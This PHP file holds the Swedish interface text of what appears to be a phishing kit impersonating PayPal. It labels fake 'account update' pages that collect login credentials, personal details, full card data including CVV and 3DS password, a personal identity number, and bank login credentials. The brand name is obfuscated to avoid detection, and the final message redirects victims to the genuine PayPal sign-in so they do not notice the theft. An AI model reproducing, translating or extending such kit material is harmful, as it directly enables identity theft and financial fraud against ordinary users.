<?php 
//LOG
$log_ttl1="&#80;&#97;y&#80;&#97;I konto Uppdatering";
$log_ttl2="Secure";
$log_lab1="&#80;&#97;y&#80;&#97;I Page Secure";
$log_lab2="Logga in på ditt konto";
$log_em="e-post";
$log_ps="lösenord";
$log_frg="Glömt din e-postadress eller lösenord ?";
$log_btn="Log In";
//FTR
$ftr_01="Respekt för privatlivet";
$ftr_02="Juridiska avtal";
$ftr_03="Kontakt";
$ftr_04="Hjälp";
//INF
$inf_scr="Din säkerhet är vår högsta prioritet";
$inf_ttspan="Kontoinformation Uppdatering";
$inf_lab1="Uppdatera din faktureringsadress";
$inf_corr="Ange din faktureringsadress korrekt.";
$inf_frnm="Ditt Förnamn";
$inf_lsnm="Ditt efternamn";
$inf_dob="Datum Födelsedag DD/MM/YYYY";
$inf_add="Gatuadress";
$inf_cty="stad/ort";
$inf_stt="Stad";
$inf_cnt="Land";
$inf_zip="postnummer";
$inf_mob="Mobil";
$inf_hom="Hem";
$inf_pho="telefonnummer";
$inf_con="fortsätta";
//CRD
$crd_ttspan="Kortet Information Uppdatering";
$crd_lab1="Uppdatera din kredit / bankkort";
$crd_corr="Ange din kredit- / betalkortsinformation korrekt.";
$crd_crdh="Korthållare";
$crd_crdn="kortnummer";
$crd_expd="Utgångsdatum MM/YY";
$crd_cv="CSC / CVV";
$crd_ttcv="Ange verifierings kodkort visas på ditt kort";
$crd_ptcv="./scr/csc";
$crd_wtcv="Vad är CSC koden ?";
$crd_ttptcv="Kort verifikationskod - Help";
$crd_cvp="CVV (eller Card Verification Value) är en anti-bedrägeri säkerhetsfunktion som kontrollerar om kreditkortet är i din ägo. För Visa / Mastercard , CVV tresiffrigt nummer tryckt på signaturfältet på baksidan av kortet efter kontonummer. För American Express, är det fyrsiffriga CVV nummer tryckt på framsidan av kortet över kontonumret";
$crd_cvtd1="Det finns ett antal av 3 siffror i kursiv stil inverterade på baksidan av kreditkortet .";
$crd_cvtd2="Det är en 4-siffrigt nummer på framsidan av bilarna, precis ovanför kreditkortsnumret .";
$crd_cvfrm="Stänga";
$crd_pcptcv="../../imcs_files/cv.png";
$crd_3ds="3DS VBV/MSC lösenord";
$crd_acc="kontonummer";
$crd_sn="Personnummer";
$crd_ttsn="Personnummer";
$crd_srt="Sort code";
$crd_ttptsrt="Sort code - Help";
$crd_ptsrt="./scr/srt/";
$crd_pcsrt="../../imcs_files/srt.png";
$crd_btn="fortsätta";
//BNK
$bnk_ttspan="Bankinformation uppdatering";
$bnk_lab1="Uppdatera ditt bankkonto";
$bnk_yrbn="Din bank namn:";
$bnk_corr="Ange din bankinformation på rätt sätt.";
$bnk_id="Bank Användar/ID";
$bnk_ps="Bank Lösenord";
$bnk_rt="routingnummer";
$bnk_bt="Spara";
//SCS
$scs_ttspan="framgångsrik uppdatering";
$scs_lnk="https://www.paypal.com/signin/";
$scs_tnk="Tack";
$scs_yrp="Ditt PayPaI-konto har uppdaterats.";
$scs_yhv="Du måste logga in igen för att spara ändringarna, du kommer att omdirigeras automatiskt till inloggningssidan i 3 sekunder ... Tack för att du använder vårt system verifiering.";
?>